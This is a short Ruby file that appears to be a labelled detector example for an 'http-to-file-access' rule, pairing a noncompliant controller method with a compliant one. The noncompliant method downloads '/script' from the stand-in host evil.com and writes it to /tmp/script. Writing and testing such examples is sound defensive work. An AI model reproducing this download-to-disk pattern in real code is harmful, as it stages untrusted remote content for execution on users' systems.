=begin
Copyright Amazon.com, Inc. or its affiliates. All Rights Reserved.
SPDX-License-Identifier: Apache-2.0
=end

require "net/http"

class ExampleController < ActionController::Base

  # {fact rule=http-to-file-access@v1.0 defects=1}
  def http_file_access_noncompliant
    resp = Net::HTTP.new("evil.com").get("/script").body
    file = File.open("/tmp/script", "w")

    # Noncompliant: Writing a file from http access.
    file.write(resp) 
  end
  # {/fact}


  # {fact rule=http-to-file-access@v1.0 defects=0}
  def http_file_access_compliant
    a = "a"
    file = File.open("/tmp/script", "w")

    # Compliant: Not using any http access to write in file.
    file.write(a) 

  end
  # {/fact}
  
end
